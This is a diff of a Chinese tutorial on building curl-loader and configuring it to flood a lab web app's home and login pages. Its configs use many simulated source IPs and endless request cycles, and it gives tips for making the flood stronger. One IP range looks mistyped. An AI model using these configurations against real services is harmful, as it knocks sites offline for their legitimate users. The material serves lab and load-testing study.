@@ -89,3 +89,214 @@ make
 编译完成后会在当前目录下生成可执行程序：curl-loader
 ```
 
+> 安装的过程中可能会遇到如下报错
+>
+> ```
+> In file included from ssl_thr_lock.c:29:0:
+> ssl_thr_lock.h:27:28: 致命错误：openssl/crypto.h：没有那个文件或目录
+>  #include <openssl/crypto.h>
+>                             ^
+> 编译中断。
+> make: *** [obj/ssl_thr_lock.o] 错误 1
+> 
+> ```
+>
+> 原因是因为缺少了 openssl 模块 ，需要下载
+>
+> ```
+> yum install openssl-devel -y
+> ```
+>
+> 然后再重新 make
+
+## 三、使用curl-loader进行流量泛洪
+
+#### 1.curl-loader配置
+
+安装好了curl-loader之后，需要做如下操作
+
+```
+#创建一个文件夹存放curl，并且在该文件夹中同时存放两个文件
+mkdir curl-loader
+
+cp /opt/myloader/curl-loader-0.56/curl-loader /opt/curl-loader
+
+cp /opt/myloader/curl-loader-0.56/conf-examples/10K.conf /opt/curl-loader
+
+vi home_login.conf
+#该文件内容如下形式
+```
+
+![image-20240130183829678](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240130183829678.png)
+
+```
+####################### GENERAL_SECTION ########################
+BATCH_NAME=Home-Login
+CLIENTS_NUM_MAX=20
+INTERFACE=ens32
+NETMASK=24
+IP_ADDR_MIN=192.168.230.10
+IP_ADDR_MAX=192.168.230.50
+CYCLES_NUM=-1
+URLS_NUM=2
+
+
+
+###################### URL_SECTION ############################
+# GET-part
+URL= http://192.168.230.147:8083/woniusales/
+URL_SHORT_NAME="Home-Get"
+REQUEST_TYPE=GET
+TIMER_URL_COMPLETION=3000
+TIMER_AFTER_URL_SLEEP=100
+
+
+# POST-part
+URL="http://192.168.230.147:8083/woniusales/user/login"
+URL_SHORT_NAME="Login-Post"
+USERNAME=admin
+PASSWORD=admin123
+REQUEST_TYPE=POST
+FORM_USAGE_TYPE=SINGLE_USER
+FORM_STRING=username=%s&password=%s
+TIMER_URL_COMPLETION=3000
+TIMER_AFTER_URL_SLEEP=200
+
+```
+
+#### 2.泛洪操作和查看
+
+```
+curl-loader -f home_login.conf
+```
+
+在另一个窗口中动态查看 tomcat 的访问日志 /usr/local/tomcat/logs/localhost_access_log.2024-01-30.txt
+
+```
+tail -f /usr/local/tomcat/logs/localhost_access_log.2024-01-30.txt
+```
+
+
+
+![image-20240130183951437](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240130183951437.png)
+
+就可以看到如下结果，以不同的IP访问，且最后的状态码也是200，表示成功，500表示服务器错误
+
+> 要想使得泛洪攻击更加猛烈我们可以修改 home_login.conf 配置文件中的以下参数
+>
+> - CLIENTS_NUM_MAX=20
+>   - 表示模拟的最大的客户端的数量，即并发量
+>
+> - IP_ADDR_MIN=192.168.230.10
+>
+>   - 表示模拟的IP地址的起始
+>
+> - IP_ADDR_MAX=192.168.230.50
+>
+>   - 表示模拟的IP地址的终止
+>
+> - CLIENTS_NUM_MAX=20
+>
+>   - 表示以多少线程进行高并发
+>
+> - FORM_USAGE_TYPE=SINGLE_USER
+>
+>   - 表示所有模拟的客户端都以一个账号登录
+>
+> - URL_DONT_CYCLE = 1
+>
+>   - 表示攻击只循环一次，要想循环就不写这个参数
+>
+> - ```
+>   USERNAME=admin
+>   PASSWORD=admin123
+>   REQUEST_TYPE=POST
+>   FORM_USAGE_TYPE=SINGLE_USER
+>   FORM_STRING=username=%s&password=%s
+>   ```
+>
+>   - 表示发送一个POST请求，其由正文数据，请求类型，账户使用情况，对应的正文数据参数
+>
+> - 更加详细的字段解释请看 [常见问题解答 (sourceforge.net)](https://curl-loader.sourceforge.net/doc/faq.html)
+
+我们可以简单拿来看一下，我们泛洪攻击的效果
+
+![image-20240130190719146](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240130190719146.png)
+
+- 2XX表示正常，成功的登录
+
+- 5XX表示服务器出错的，说明我们泛洪攻击还是有效果的
+- Ti表示吞吐量进来的量，即请求量大小
+- To表示吞吐量吐出去的量，即服务器响应量的大小
+
+#### 3.home_login.conf配置文件写法
+
+使用模版 /opt/myloader/curl-loader-0.56/conf-examples/get-post-login-cycling.conf 
+
+> /opt/myloader/curl-loader-0.56/conf-examples/ 目录下的很多 conf 文件都是泛洪攻击的配置文件的模板，我们可以参考他们的写法
+
+```
+cp /opt/myloader/curl-loader-0.56/conf-examples/get-post-login-cycling.conf /opt/myloader
+```
+
+![image-20240130193955096](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240130193955096.png)
+
+该文件原本内容如下图所示
+
+![image-20240130194852395](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240130194852395.png)
+
+我们将其修改为如下信息（//以后的信息为注释信息，不用写在文件里）
+
+```
+########### GENERAL SECTION ################################
+BATCH_NAME=get_post_cycling
+CLIENTS_NUM_MAX = 200	//所模拟客户端的数量，即并发的数量
+INTERFACE=eth0
+NETMASK=24	//子网掩码位数
+IP_ADDR_MIN=192.168.230.5	//客户端起始IP
+IP_ADDR_MAX=194.168.230.205 	//客户端终止IP
+CYCLES_NUM= -1	//无限循环
+URLS_NUM=2	//URL地址个数，即下面的URL个数
+
+
+########### URL SECTION ##################################
+
+### Login URL -  only once for each client
+
+# GET-part
+URL= http://192.168.230.147:8083/woniusales/
+URL_SHORT_NAME="Login-GET"
+#URL_DONT_CYCLE = 1
+REQUEST_TYPE=GET
+TIMER_URL_COMPLETION = 1000 # In msec. When positive, Now it is enforced by cancelling url fetch on timeout		//多少ms发一次请求
+TIMER_AFTER_URL_SLEEP = 20	//发完一次请求休息多少ms
+
+# POST-part
+URL="http://192.168.230.147:8083/woniusales/user/login"
+URL_USE_CURRENT= 1
+URL_SHORT_NAME="Login-POST"
+#URL_DONT_CYCLE = 1
+USERNAME=admin
+PASSWORD=admin123
+REQUEST_TYPE=POST
+FORM_USAGE_TYPE= SINGLE_USER
+FORM_STRING= username=%s&password=%s # Means the same credentials for all clients/users
+TIMER_URL_COMPLETION = 1000     # In msec. When positive, Now it is enforced by cancelling url fetch on timeout
+TIMER_AFTER_URL_SLEEP = 20
+
+```
+
+其中部分信息我们可以使用 Fidder 先进行测试
+
+![image-20240130195717767](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240130195717767.png)
+
+![image-20240130195706057](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240130195706057.png)
+
+
+
+![image-20240130195828265](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240130195828265.png)
+
+![image-20240130195834655](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240130195834655.png)
+
+其中一些GET和POST的URL地址请求就在里面
+
